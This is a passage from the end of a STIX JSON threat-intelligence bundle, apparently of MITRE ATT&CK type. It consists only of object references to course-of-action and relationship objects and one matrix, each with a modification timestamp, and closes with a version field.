"course-of-action--74a50fce-ef6e-4575-8535-5c0c07415d0b", "object_modified": "2025-08-12T19:58:34.762096Z"}, {"object_ref": "course-of-action--bf7a7cc1-18bc-4e40-9524-40e582edee1e", "object_modified": "2025-08-12T19:58:34.76242Z"}, {"object_ref": "course-of-action--618a733d-5483-40b5-a806-c8193c5e88bc", "object_modified": "2025-08-12T19:58:34.762646Z"}, {"object_ref": "course-of-action--12d79dac-1d29-4988-ab18-013654b9e1cf", "object_modified": "2025-08-12T19:58:34.762958Z"}, {"object_ref": "course-of-action--5bc32c96-9f7e-4fbe-b209-9129cc94e598", "object_modified": "2025-08-12T19:58:34.763182Z"}, {"object_ref": "course-of-action--e1c12848-fd8f-4270-a550-4b0595b16546", "object_modified": "2025-08-12T19:58:34.763505Z"}, {"object_ref": "course-of-action--8ed6c38c-4715-4764-bf91-2ecb4c0f6ec4", "object_modified": "2025-08-12T19:58:34.763797Z"}, {"object_ref": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "object_modified": "2025-08-12T19:58:34.764079Z"}, {"object_ref": "course-of-action--e12c9cc1-de46-4b0c-8204-c9dc67ca8a39", "object_modified": "2025-08-12T19:58:34.764451Z"}, {"object_ref": "course-of-action--4601ffbb-044c-4964-9643-c09eb4cd2263", "object_modified": "2025-08-12T19:58:34.764599Z"}, {"object_ref": "course-of-action--acac05f4-091b-4f75-92b1-8c9cc5673601", "object_modified": "2025-08-12T19:58:34.764896Z"}, {"object_ref": "course-of-action--10c73291-d9ac-45cd-be74-5efde9361756", "object_modified": "2025-08-12T19:58:34.765213Z"}, {"object_ref": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "object_modified": "2025-08-12T19:58:34.765466Z"}, {"object_ref": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "object_modified": "2025-08-12T19:58:34.766147Z"}, {"object_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "object_modified": "2025-08-12T19:58:34.76663Z"}, {"object_ref": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "object_modified": "2025-08-12T19:58:34.767105Z"}, {"object_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "object_modified": "2025-08-12T19:58:34.767472Z"}, {"object_ref": "course-of-action--fb2f4bad-bf77-410c-9756-5afa7a5113fd", "object_modified": "2025-08-12T19:58:34.768245Z"}, {"object_ref": "relationship--3f3e25fb-48ff-44dd-8cac-f7c6025e8354", "object_modified": "2025-08-12T19:58:34.744441Z"}, {"object_ref": "relationship--63ea6e63-f151-407e-8aa6-7e746729aa00", "object_modified": "2025-08-12T19:58:34.744764Z"}, {"object_ref": "relationship--03bc50cb-b619-4142-b97e-5ccce7e2e45d", "object_modified": "2025-08-12T19:58:34.744923Z"}, {"object_ref": "relationship--29a4d626-f922-47de-bb59-fef47cc5893d", "object_modified": "2025-08-12T19:58:34.745542Z"}, {"object_ref": "relationship--0be0f6b7-449d-451e-91ec-fd713f817829", "object_modified": "2025-08-12T19:58:34.74569Z"}, {"object_ref": "relationship--6ac7cf79-615f-4212-a641-ccea6cc9169f", "object_modified": "2025-08-12T19:58:34.745925Z"}, {"object_ref": "relationship--9c24a271-2600-4cb7-bd0d-d4edf96c53b4", "object_modified": "2025-08-12T19:58:34.746071Z"}, {"object_ref": "relationship--b8949c5d-d345-4bc7-a94e-d2a9676e0b73", "object_modified": "2025-08-12T19:58:34.746309Z"}, {"object_ref": "relationship--eaef3fd7-9058-42e2-b0b6-c7ad36152423", "object_modified": "2025-08-12T19:58:34.746546Z"}, {"object_ref": "relationship--16e461eb-d31c-4c00-bef5-72614704bb5e", "object_modified": "2025-08-12T19:58:34.746686Z"}, {"object_ref": "relationship--0df25358-53a1-4ac4-b583-844d55761564", "object_modified": "2025-08-12T19:58:34.746997Z"}, {"object_ref": "relationship--cf7f934a-1b78-47c8-a6ec-6472d1fae283", "object_modified": "2025-08-12T19:58:34.747136Z"}, {"object_ref": "relationship--9f02200d-d632-4386-893f-8a85b8cebaec", "object_modified": "2025-08-12T19:58:34.747274Z"}, {"object_ref": "relationship--5c2d0112-8a93-449b-862e-a2306c66fb03", "object_modified": "2025-08-12T19:58:34.74741Z"}, {"object_ref": "relationship--07ebf914-9470-43bb-af4a-b94c257c074f", "object_modified": "2025-08-12T19:58:34.748334Z"}, {"object_ref": "relationship--285cbcb7-b489-41b1-a587-71e7fb26f791", "object_modified": "2025-08-12T19:58:34.748476Z"}, {"object_ref": "relationship--bb6f555b-1120-4a2d-b506-026a2a4c24be", "object_modified": "2025-08-12T19:58:34.748617Z"}, {"object_ref": "relationship--695355eb-6fed-4fe0-ac6c-34e32fdfb6c4", "object_modified": "2025-08-12T19:58:34.748934Z"}, {"object_ref": "relationship--7b2d26c0-b0cd-4d08-acb7-61afc1bdcceb", "object_modified": "2025-08-12T19:58:34.749373Z"}, {"object_ref": "relationship--b865b3a0-16f0-4936-8e3a-4a9c727c40f6", "object_modified": "2025-08-12T19:58:34.749518Z"}, {"object_ref": "relationship--01e12972-d3de-47ff-b92a-ec86d56fde58", "object_modified": "2025-08-12T19:58:34.749752Z"}, {"object_ref": "relationship--a47e91fc-d1ae-4ace-b9fd-1f880d1b94bd", "object_modified": "2025-08-12T19:58:34.749891Z"}, {"object_ref": "relationship--3df2e6ca-e83c-4dae-ae6e-ce980e5f6a9a", "object_modified": "2025-08-12T19:58:34.750027Z"}, {"object_ref": "relationship--95a70e5b-4bda-4731-8476-5487ca90859d", "object_modified": "2025-08-12T19:58:34.751132Z"}, {"object_ref": "relationship--35d85daa-6c84-4c88-a867-8a9b8efe467b", "object_modified": "2025-08-12T19:58:34.751274Z"}, {"object_ref": "relationship--1e25f273-d57a-46f8-8d36-9fc4ee538c77", "object_modified": "2025-08-12T19:58:34.751415Z"}, {"object_ref": "relationship--56ddbf67-01e8-49a0-947c-a21dfebd862f", "object_modified": "2025-08-12T19:58:34.751556Z"}, {"object_ref": "relationship--b723b747-9eff-4762-8477-9b66c3d3bd63", "object_modified": "2025-08-12T19:58:34.751696Z"}, {"object_ref": "relationship--1f462c8a-140a-44a4-8123-1894edbf5097", "object_modified": "2025-08-12T19:58:34.75206Z"}, {"object_ref": "relationship--769c0845-2c8b-45d0-8f5f-e1d4112e8bf0", "object_modified": "2025-08-12T19:58:34.752219Z"}, {"object_ref": "relationship--f60f8182-3a15-47f7-85b1-8f7551a0d9be", "object_modified": "2025-08-12T19:58:34.752363Z"}, {"object_ref": "relationship--d9913161-71d2-46d4-96be-ad6a41290e37", "object_modified": "2025-08-12T19:58:34.752502Z"}, {"object_ref": "relationship--892c29cd-5e85-486c-b768-10a58f77a1ce", "object_modified": "2025-08-12T19:58:34.75264Z"}, {"object_ref": "relationship--c4c91e4f-30a2-4f1d-bf02-5ce0231d4c90", "object_modified": "2025-08-12T19:58:34.753038Z"}, {"object_ref": "relationship--a3bafb6b-c918-4686-842e-89e1c0338da4", "object_modified": "2025-08-12T19:58:34.753174Z"}, {"object_ref": "relationship--4d3c8abe-19ac-464b-bfb3-51f8c6c1ac13", "object_modified": "2025-08-12T19:58:34.753398Z"}, {"object_ref": "relationship--5725a5d2-7d80-4eb0-9d3d-003105664618", "object_modified": "2025-08-12T19:58:34.75415Z"}, {"object_ref": "relationship--0ff50cbe-2243-40d0-a60b-0b33b6da2066", "object_modified": "2025-08-12T19:58:34.754547Z"}, {"object_ref": "relationship--6d84a5d4-04c0-474a-b5bb-3ade104ae97f", "object_modified": "2025-08-12T19:58:34.754685Z"}, {"object_ref": "relationship--d8d32d1e-a815-4cb8-bff7-170d46659782", "object_modified": "2025-08-12T19:58:34.754916Z"}, {"object_ref": "relationship--1d94cde6-d03d-4afd-959d-9b908b86555c", "object_modified": "2025-08-12T19:58:34.755571Z"}, {"object_ref": "relationship--7ac3b09f-fe0e-4289-9cd2-c7f3854a38f5", "object_modified": "2025-08-12T19:58:34.755711Z"}, {"object_ref": "relationship--db608832-42fe-4c54-871b-38177036ea8a", "object_modified": "2025-08-12T19:58:34.755849Z"}, {"object_ref": "relationship--af0d3110-b435-4444-8c3d-fa45d2f02b7c", "object_modified": "2025-08-12T19:58:34.756161Z"}, {"object_ref": "relationship--426523ac-e6b9-4878-85b0-2534caae1068", "object_modified": "2025-08-12T19:58:34.756297Z"}, {"object_ref": "relationship--57de5ad6-2382-4a75-a725-d089a181a696", "object_modified": "2025-08-12T19:58:34.756434Z"}, {"object_ref": "relationship--644a6da9-f98c-4941-8d72-65a3146c8efd", "object_modified": "2025-08-12T19:58:34.75708Z"}, {"object_ref": "relationship--35b6e417-17c2-4d27-b410-beb62fc6e637", "object_modified": "2025-08-12T19:58:34.758561Z"}, {"object_ref": "relationship--8a18a227-cc19-4e29-a673-d51cd5f59b4c", "object_modified": "2025-08-12T19:58:34.758633Z"}, {"object_ref": "relationship--16725b88-33d1-4fe9-afd4-60f7aefcaa3b", "object_modified": "2025-08-12T19:58:34.7587Z"}, {"object_ref": "relationship--4b082a68-6633-47e8-aea0-9e4c8ddb5725", "object_modified": "2025-08-12T19:58:34.758766Z"}, {"object_ref": "relationship--d3fd1c61-22a3-41f9-ab9c-97f47a3bbf98", "object_modified": "2025-08-12T19:58:34.758905Z"}, {"object_ref": "relationship--8c3fc49e-6591-4eb0-9333-7df3b2627474", "object_modified": "2025-08-12T19:58:34.75897Z"}, {"object_ref": "relationship--4c324a74-8156-47bd-aeb8-46816ca0042c", "object_modified": "2025-08-12T19:58:34.759044Z"}, {"object_ref": "relationship--193a1cad-cdf2-40df-802b-1898cb1d4059", "object_modified": "2025-08-12T19:58:34.759193Z"}, {"object_ref": "relationship--d992816a-8316-45db-a92a-8de9b2dadb3e", "object_modified": "2025-08-12T19:58:34.759264Z"}, {"object_ref": "relationship--5c18ec3e-6e6b-45da-9e75-346e605d7106", "object_modified": "2025-08-12T19:58:34.759343Z"}, {"object_ref": "relationship--e2431e81-5229-438f-800b-23d127008a2e", "object_modified": "2025-08-12T19:58:34.759416Z"}, {"object_ref": "relationship--2b757650-ad6b-4013-8bcb-7eb49184d0a4", "object_modified": "2025-08-12T19:58:34.759558Z"}, {"object_ref": "relationship--877e184c-c571-4fa7-83bd-2adb937a53bb", "object_modified": "2025-08-12T19:58:34.759631Z"}, {"object_ref": "relationship--deae2ebe-9d1e-4c52-830a-8a64429649e0", "object_modified": "2025-08-12T19:58:34.759782Z"}, {"object_ref": "relationship--54f41f54-0ad3-44b4-8dc4-c522d7462032", "object_modified": "2025-08-12T19:58:34.759859Z"}, {"object_ref": "relationship--4783f487-3d81-4f39-8666-9ef0a209099b", "object_modified": "2025-08-12T19:58:34.760011Z"}, {"object_ref": "relationship--b39cbb72-0942-4c63-a49f-86fca661096d", "object_modified": "2025-08-12T19:58:34.76008Z"}, {"object_ref": "relationship--03701ebd-6840-486b-840c-a00574abd30d", "object_modified": "2025-08-12T19:58:34.760149Z"}, {"object_ref": "relationship--068f3773-ea8d-44dc-8966-d9d151904d7a", "object_modified": "2025-08-12T19:58:34.76022Z"}, {"object_ref": "relationship--d39cdc8b-5767-4da1-8b2b-ee4d51482cfd", "object_modified": "2025-08-12T19:58:34.760289Z"}, {"object_ref": "relationship--73201125-dfd5-4729-836e-8cc95127401d", "object_modified": "2025-08-12T19:58:34.76036Z"}, {"object_ref": "relationship--87f11b10-a9c2-486c-85d0-2ae1ca3e9056", "object_modified": "2025-08-12T19:58:34.760429Z"}, {"object_ref": "relationship--18c6a767-c2c3-4276-97e1-92548d930eda", "object_modified": "2025-08-12T19:58:34.7605Z"}, {"object_ref": "relationship--a4d68b59-e5b9-4496-97e3-9438f34727f6", "object_modified": "2025-08-12T19:58:34.760569Z"}, {"object_ref": "relationship--0e68d80c-75c2-45ee-8aa9-40aded848417", "object_modified": "2025-08-12T19:58:34.760638Z"}, {"object_ref": "relationship--2055e937-8f32-4a0d-82ff-695f3b43d577", "object_modified": "2025-08-12T19:58:34.760773Z"}, {"object_ref": "relationship--0d4e9c2d-db0d-42c2-8b13-6862553413b5", "object_modified": "2025-08-12T19:58:34.76084Z"}, {"object_ref": "relationship--b1af5e34-1f9b-4dca-8467-d3593bcdc6b7", "object_modified": "2025-08-12T19:58:34.760909Z"}, {"object_ref": "relationship--b5decc8a-38a5-4a9d-8eba-beb915f8c031", "object_modified": "2025-08-12T19:58:34.760978Z"}, {"object_ref": "relationship--5b412a3f-5cdb-41f3-b3a1-d60532387f03", "object_modified": "2025-08-12T19:58:34.761044Z"}, {"object_ref": "relationship--9b33c6d2-d8e7-45f7-936a-60d1270e5bd9", "object_modified": "2025-08-12T19:58:34.761113Z"}, {"object_ref": "relationship--ec82c456-700c-4a3f-9ad3-d670843435bb", "object_modified": "2025-08-12T19:58:34.761185Z"}, {"object_ref": "relationship--8feb6386-a017-4a3c-bf74-869c72e889dd", "object_modified": "2025-08-12T19:58:34.761326Z"}, {"object_ref": "relationship--38c241a9-b45c-4acd-8d74-0fe62cc0e37e", "object_modified": "2025-08-12T19:58:34.76139Z"}, {"object_ref": "relationship--fe53b2e4-993c-45a8-9dda-b4bb8380a751", "object_modified": "2025-08-12T19:58:34.761455Z"}, {"object_ref": "relationship--4eaa9618-b2a8-46fb-a143-f4fbcca90045", "object_modified": "2025-08-12T19:58:34.761522Z"}, {"object_ref": "relationship--c2f35f7c-5d6f-4d94-a616-7deb311e7c7b", "object_modified": "2025-08-12T19:58:34.761588Z"}, {"object_ref": "relationship--69a2b7a7-8d44-43e5-b7ac-5b9bcc4c3183", "object_modified": "2025-08-12T19:58:34.761722Z"}, {"object_ref": "relationship--bbca493f-7350-4218-9120-3ebf01c4ee56", "object_modified": "2025-08-12T19:58:34.76179Z"}, {"object_ref": "relationship--eb010020-c896-4939-81f8-b04f313ef45f", "object_modified": "2025-08-12T19:58:34.761945Z"}, {"object_ref": "relationship--f2cd8262-beef-4477-8370-c52f00d4189e", "object_modified": "2025-08-12T19:58:34.762168Z"}, {"object_ref": "relationship--1d8d0eb5-e5c3-4559-a0df-12373e8869f6", "object_modified": "2025-08-12T19:58:34.762247Z"}, {"object_ref": "relationship--7335e73b-063c-4506-9f6c-a04b0c86aa29", "object_modified": "2025-08-12T19:58:34.762329Z"}, {"object_ref": "relationship--03a36302-311a-4a92-83c7-fe8db28ece43", "object_modified": "2025-08-12T19:58:34.762485Z"}, {"object_ref": "relationship--2e149a10-9832-4a8f-b989-a5a7838d839b", "object_modified": "2025-08-12T19:58:34.762559Z"}, {"object_ref": "relationship--b3335d77-464e-4405-a6bc-f023c78442d2", "object_modified": "2025-08-12T19:58:34.762724Z"}, {"object_ref": "relationship--36243687-a383-4eb6-86b8-26e3d15711c4", "object_modified": "2025-08-12T19:58:34.762799Z"}, {"object_ref": "relationship--11bf9b8c-889f-4e29-bbcb-d73e1cfc80d9", "object_modified": "2025-08-12T19:58:34.762874Z"}, {"object_ref": "relationship--ee72c350-bd72-417a-b96d-cb78c1338c00", "object_modified": "2025-08-12T19:58:34.763046Z"}, {"object_ref": "relationship--5e38db00-f3eb-4d7b-8416-68a900830a1a", "object_modified": "2025-08-12T19:58:34.763257Z"}, {"object_ref": "relationship--9f0a71b2-7c9c-4baa-8fdc-0d6c12c50955", "object_modified": "2025-08-12T19:58:34.763345Z"}, {"object_ref": "relationship--32f5970a-5b7a-4e58-a41f-fa4ad9de6a20", "object_modified": "2025-08-12T19:58:34.763418Z"}, {"object_ref": "relationship--68c02d5e-e692-4f6d-942c-1fd2944923c4", "object_modified": "2025-08-12T19:58:34.763569Z"}, {"object_ref": "relationship--2e875b37-a839-4ad3-8dd4-76dafa191e8e", "object_modified": "2025-08-12T19:58:34.763639Z"}, {"object_ref": "relationship--5878e34c-c356-42c1-b5b2-a8be56349c54", "object_modified": "2025-08-12T19:58:34.76371Z"}, {"object_ref": "relationship--460036be-9bec-4af7-95e0-7528f69b3f75", "object_modified": "2025-08-12T19:58:34.763855Z"}, {"object_ref": "relationship--39658aff-9524-43fd-866a-ce7e981bbfd0", "object_modified": "2025-08-12T19:58:34.763929Z"}, {"object_ref": "relationship--7170cc81-b878-4afc-ad62-3c142669db3a", "object_modified": "2025-08-12T19:58:34.763996Z"}, {"object_ref": "relationship--5b9038cb-98d6-4257-b945-32e09ea41fc8", "object_modified": "2025-08-12T19:58:34.764143Z"}, {"object_ref": "relationship--3a0e82fa-3695-4994-bdd8-dec7eec41741", "object_modified": "2025-08-12T19:58:34.764219Z"}, {"object_ref": "relationship--51462767-e55b-43b2-9e8f-e70268c8805a", "object_modified": "2025-08-12T19:58:34.764293Z"}, {"object_ref": "relationship--387c87ac-399d-4c5b-adf7-e2426a2867c4", "object_modified": "2025-08-12T19:58:34.764366Z"}, {"object_ref": "relationship--5562b889-b416-475e-8c53-43a23107d58e", "object_modified": "2025-08-12T19:58:34.764514Z"}, {"object_ref": "relationship--254b15af-f131-4ffe-9af4-6d4629ac93ce", "object_modified": "2025-08-12T19:58:34.764662Z"}, {"object_ref": "relationship--8f682d35-b5dd-4781-85f3-c37c9be1da89", "object_modified": "2025-08-12T19:58:34.764742Z"}, {"object_ref": "relationship--f52a85ef-3d27-4f77-8653-4465dac9e96f", "object_modified": "2025-08-12T19:58:34.764812Z"}, {"object_ref": "relationship--e05e02d0-30f3-40dc-8e89-8be2e90c329d", "object_modified": "2025-08-12T19:58:34.764959Z"}, {"object_ref": "relationship--35e101fc-0f07-4a87-bad4-be1de68be40b", "object_modified": "2025-08-12T19:58:34.765084Z"}, {"object_ref": "relationship--327cfc1a-a443-4df9-a5b8-7924782e2ee6", "object_modified": "2025-08-12T19:58:34.765284Z"}, {"object_ref": "relationship--db17c1a6-49b5-42bb-acbc-1e78f952e189", "object_modified": "2025-08-12T19:58:34.765364Z"}, {"object_ref": "relationship--54ceb612-ad88-404d-99eb-9acc5f6eb0df", "object_modified": "2025-08-12T19:58:34.76559Z"}, {"object_ref": "relationship--556f2e1b-1d59-4708-b207-7ea2fbeebf36", "object_modified": "2025-08-12T19:58:34.76572Z"}, {"object_ref": "relationship--ac64f84f-f7d3-495a-a350-edbfea03c765", "object_modified": "2025-08-12T19:58:34.765813Z"}, {"object_ref": "relationship--f05ae726-1798-4751-af09-5f551201eaa9", "object_modified": "2025-08-12T19:58:34.765901Z"}, {"object_ref": "relationship--16ae7aa9-300d-4227-9f1c-97f189a8f66d", "object_modified": "2025-08-12T19:58:34.765986Z"}, {"object_ref": "relationship--0b0a6f1f-02fe-47c7-ba67-8100de2f281b", "object_modified": "2025-08-12T19:58:34.766055Z"}, {"object_ref": "relationship--7d72f292-fb51-4464-b5dc-17bbda073a6f", "object_modified": "2025-08-12T19:58:34.766223Z"}, {"object_ref": "relationship--fa91b370-1bb5-4840-9be7-0edb39c0ca1f", "object_modified": "2025-08-12T19:58:34.766307Z"}, {"object_ref": "relationship--10dcb87a-85d9-4978-9986-7c78003020c8", "object_modified": "2025-08-12T19:58:34.766387Z"}, {"object_ref": "relationship--138cf94d-a513-414d-9f9b-3d140f0c44b1", "object_modified": "2025-08-12T19:58:34.766465Z"}, {"object_ref": "relationship--5a6fb9a6-895c-4134-a02b-1c4bd54d1088", "object_modified": "2025-08-12T19:58:34.766544Z"}, {"object_ref": "relationship--7db7d021-6f55-478a-be12-ba38b569aa0a", "object_modified": "2025-08-12T19:58:34.766704Z"}, {"object_ref": "relationship--c747b35b-6968-4be5-b358-49356265d8a7", "object_modified": "2025-08-12T19:58:34.766785Z"}, {"object_ref": "relationship--2becd166-9d3a-469b-956a-3656407ba2c5", "object_modified": "2025-08-12T19:58:34.766865Z"}, {"object_ref": "relationship--1efefeb3-2f99-4a1f-bd24-8407f82d4f46", "object_modified": "2025-08-12T19:58:34.766944Z"}, {"object_ref": "relationship--2da834e7-b548-496e-a702-79251caf658b", "object_modified": "2025-08-12T19:58:34.767022Z"}, {"object_ref": "relationship--064d4f84-0d23-44d3-ae42-20d821a1624c", "object_modified": "2025-08-12T19:58:34.767168Z"}, {"object_ref": "relationship--a6c42163-ecd4-4e8d-98fa-f7803da04876", "object_modified": "2025-08-12T19:58:34.767239Z"}, {"object_ref": "relationship--1fbdd211-9ace-405a-bf66-36787d402c08", "object_modified": "2025-08-12T19:58:34.767311Z"}, {"object_ref": "relationship--3c5d32e5-9de9-403f-864f-09463fc4aa46", "object_modified": "2025-08-12T19:58:34.76739Z"}, {"object_ref": "relationship--f002e1aa-02e5-4f05-a69a-d17e9a7d66f2", "object_modified": "2025-08-12T19:58:34.767535Z"}, {"object_ref": "relationship--43e0ebe0-0495-4155-ab6e-0954c6d0f842", "object_modified": "2025-08-12T19:58:34.767605Z"}, {"object_ref": "relationship--ede87428-6ffb-4c68-bf9e-3df81cd91de1", "object_modified": "2025-08-12T19:58:34.767675Z"}, {"object_ref": "relationship--150ce844-1b34-4219-b41a-7a6cd5999364", "object_modified": "2025-08-12T19:58:34.767747Z"}, {"object_ref": "relationship--e9ab34bc-6474-46c8-829d-a4f6738e71c8", "object_modified": "2025-08-12T19:58:34.767815Z"}, {"object_ref": "relationship--fb80695c-0a32-44d0-9b9b-0e38cbc98d86", "object_modified": "2025-08-12T19:58:34.76788Z"}, {"object_ref": "relationship--b339c887-5d3e-4e99-9a59-a044fa3b398e", "object_modified": "2025-08-12T19:58:34.767944Z"}, {"object_ref": "relationship--2e2f1a5c-75d1-4a5c-850e-aa842a5543a7", "object_modified": "2025-08-12T19:58:34.768018Z"}, {"object_ref": "relationship--bf021076-43c3-4085-b543-e88e9c0ff16a", "object_modified": "2025-08-12T19:58:34.768092Z"}, {"object_ref": "relationship--eec1a4ff-5257-46d1-a32a-d2fa2721861c", "object_modified": "2025-08-12T19:58:34.768166Z"}, {"object_ref": "relationship--b0f44e41-2e84-48ea-8817-7f54c1305ce7", "object_modified": "2025-08-12T19:58:34.768301Z"}, {"object_ref": "relationship--6eacfac2-1cdb-47d6-8b84-bac7872dbaef", "object_modified": "2025-08-12T19:58:34.768369Z"}, {"object_ref": "relationship--4beed365-ca6b-4468-9882-2e447140f020", "object_modified": "2025-08-12T19:58:34.768438Z"}, {"object_ref": "x-mitre-matrix--eb4074e2-6c44-426f-a0ac-c8128dcd47c3", "object_modified": "2025-08-12T19:58:34.768565Z"}], "x_mitre_version": "0.1"}]}